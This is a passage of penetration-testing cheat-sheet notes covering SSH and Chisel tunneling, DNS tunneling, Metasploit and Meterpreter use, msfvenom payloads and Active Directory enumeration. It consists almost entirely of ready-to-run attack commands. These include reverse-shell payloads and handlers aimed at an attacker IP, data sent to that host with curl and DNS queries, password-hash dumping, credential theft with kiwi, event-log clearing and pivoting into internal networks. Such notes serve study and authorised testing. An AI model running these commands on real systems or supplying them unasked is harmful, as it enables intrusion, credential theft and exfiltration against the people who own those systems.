		3. `ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@<SSH-server>`
			1. `-L <local-bind-interface>:<local-bind-port>:<forward-to-addr>:<forward-to-port>`
			2. 172.16.50.217:445 is the destination socket routable from the SSH server
		4. `ss -ntlpu | grep 4455`              (ensure 127.0.0.1:4455 is now bound)
		5. `ssh -N -L 0.0.0.0:4242:172.16.180.217:4242 database_admin@10.4.180.215`
	3. SSH dynamic port forwarding:
		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		2. `ssh -N -D 0.0.0.0:9999 user@10.10.10.74`
			1. bind port 9999 on all interfaces as a SOCKS port that can take SOCKS formatted traffic and proxy it through the SSH server; this command is run on the SSH client
		3. `echo "socks5 192.168.77.88 9999" >> /etc/proxychains4.conf`
		4. `proxychains -q nc -v 172.16.45.66 445`              (test proxy connectivity)
		5. `proxychains nmap -n -sT -Pn 172.16.45.0/24` 
	4. SSH remote port forward:
		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		2. `ssh -N -R <listening-addr>:<listening-port>:<destination-addr>:<destination-port> kali@<attacker-IP>`
		3. `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.204`
			1. `127.0.0.1:2345` is the bind port on the SSH server you control (kali)
			2. `10.4.50.215:5432` is the destination socket routable from the compromised client
		4. `ss -ntlpu | grep 2345`                 (verify the local port is now bound)
	5. SSH remote dynamic port forward:
		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		2. `ssh -R <local-bind-port> user@192.168.45.204`
			1. `ssh -R 9999 kali@192.168.45.204`
			2. (any host routable from the compromised SSH client will be reachable via `proxychains ... 127.0.0.1:9999`)
4. tunneling/forwarding via SSHuttle:
	1. `sshuttle -r user@10.0.0.174:2222 10.4.5.0/24 172.16.50.0/24`
	2. `sshuttle -H -r kali@192.168.45.204:4444 0/0`


**Tunneling Through Deep Packet Inspection:**
1. [Chisel](https://github.com/jpillora/chisel/releases):
	2. `chisel server --port 8085 --reverse`
	3. `chisel client 192.168.45.204:8085 R:socks > /dev/null 2>&1 &`
		1. troubleshooting chisel connectivity:
			1. `sudo tcpdump -nvvXi tun0 tcp port 8081`
			2. `chisel client 192.168.45.204:8085 R:socks &> output.txt; curl --data @output.txt http://192.168.45.204:8081/`
	4.  `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h%p' kali@192.168.45.204`             (tunneling through the socks proxy at 1080)
2. Manual DNS Tunneling:
	1. `dnsmasq.conf`:
```
no-resolv
no-hosts

auth-zone=feline.corp
auth-server=feline.corp

txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else too.
```
	1. sudo dnsmasq -C dnsmasq.conf -d
	2. sudo tcpdump -i tun0 udp port 53
	3. resolvectl status              (check local DNS resolution settings)
	4. resolvectl flush-caches        (flush local name resolution caches)
	5. nslookup exfiltrated-data.controlled-domain.com 192.168.45.204
		1. (resolve A record)
	6. nslookup -type=txt www.controlled-domain.com
		1. (grab TXT records directly from controlled authoritative server; this can infiltrate data into the network)
3. [dnscat2](https://github.com/iagox86/dnscat2):
	1. `sudo tcpdump -i tun0 udp port 53`            (monitor DNS traffic on name server)
	2. `dnscat2-server controlled-domain.com` 
	3. `./dnscat controlled-domain.com`       (dnscat-client takes the domain as param 1)
	4. `dnscat2>`
```
windows
windows -i 3
?
listen 127.0.0.1:4455 172.16.4.11:445           (forward localhost to remote SMB)
listen 192.168.244.7:9998 172.16.244.217:445
```


**The Metasploit Framework:**
1. `sudo msfdb init`
2. `sudo systemctl enable postgresql`
3. `sudo msfconsole`
```
General Commands: 

db_status
workspace
workspace -a new_workspace
db_nmap -A 172.16.50.44
hosts
services
services -p 21
```
```
Auxiliary modules:

show auxiliary
search scanner/X
search type:auxiliary smb
info
show options
show missing
set RHOSTS 172.16.50.4
unset RHOSTS
services -p 445 --rhosts         (set RHOSTS to all hosts with open SMB)
run -j
vulns
creds
jobs
```
```
Exploit modules:

Ctrl-Z                 (put a session in the background)
sessions -k 12         (kill session 12)
```
```
Meterpreter payloads:

channel -l
channel -i 2
sysinfo
getuid
getsystem
hashdump
clearev
lpwd, lcd, lcat           (commands prefixed with 'l' run on the attacker)
download C:\\Users\\Alex\\Desktop\\proof.txt
upload dnscat2.exe C:\\Users\\Alex\\Desktop\\runme.exe
```
```
msfvenom:

msfvenom -l payloads --platform linux --arch x64
msfvenom -l windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o binary.exe
msfvenom -p php/reverse_php LHOST=192.168.45.204 LPORT=443 -o form.pHP -f raw
```
```
Post-Exploitation:

idletime
getsystem
getuid
ps                   (grab the PIDs of a few processes running as SYSTEM)
migrate 4234
execute -H -f notepad  (start a hidden notepad; take down it's PID migrate to it)
getenv
shell; powershell.exe -c "Import-Module NtObjectManager && Get-NtTokenIntegrityLevel"         (grab the current processes' integrity level)
search UAC
load kiwi
	- creds_msv
	- creds_all
```
```
Pivoting with Metasploit/Meterpreter:
	- either manually declare routes or have autoroute establish them automatically; turn a session into a pivot point using the portfwd command; turn the current Metasploit instance into a SOCKS proxy (127.0.0.1:1080) using multi/manage/autoroute

route add 172.16.50.0/24 3
	- params: foreign subnet, session-ID
	- auxiliary/scanner/portscan/tcp
	- exploit/windows/smb/psexec
route print
route flush

multi/manage/autoroute

auxiliary/server/socks_proxy
	- set SRVHOST 127.0.0.1
	- set VERSION 5
	- run -j

portfwd add -l 9998 -p 445 -r 172.16.50.4
	- forward 127.0.0.1:9998 to 172.16.50.4:445
	- run -j
```

**Automating Metasploit:**
1. `automate.rc`:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.204
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -j -z
```
`sudo msfconsole -r automate.rc`
2. using existing Metasploit automation scripts:
```
**these scripts derive their config options from the global Metasploit datastore
/usr/share/metasploit-framework/scripts/resource
setg RHOSTS 45.67.44.0/24
unsetg
```


**Active Directory Information and Enumeration:**

```
xfreerdp /u:Administrator /d:domain.local /v:10.0.0.174 /p:Password1#
net user /domain
net user john /domain
net group /domain                   (net.exe does not show Domain Local groups)
net group "Domain Admins" /domain
```
```
Using PowerView.ps1

Import-Module .\PowerView.ps1

Get-NetDomain
Get-NetUser | select cn
Get-Netuser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
Get-NetComputer | select operatingsystem,dnshostname

Find-LocalAdminAccess

Get-NetSession -ComputerName DC01SRV -Verbose       (this command is unreliable)

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

.\PsLoggedon.exe \\DC01SRV

setspn.exe -L alex_admin          (check if alex_admin has an SPN)

Get-NetUser -SPN | select samaccountname,serviceprincipalname
	- grabs all service accounts, displaying account name and SPN

Get-ObjectAcl -Identity alex_admin           (grab the ACEs for alex_admin)
	- look for "ActiveDirectoryRights" and "SecurityIdentifier"

Convert-SidToName <SID>

Get-ObjectAcl -Identity "<group-or-user-name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	- enumerate GenericAll rights on the domain
	- display SID and rights per object

"<SID>","<SID>","<SID>" | Convert-SidToName

```
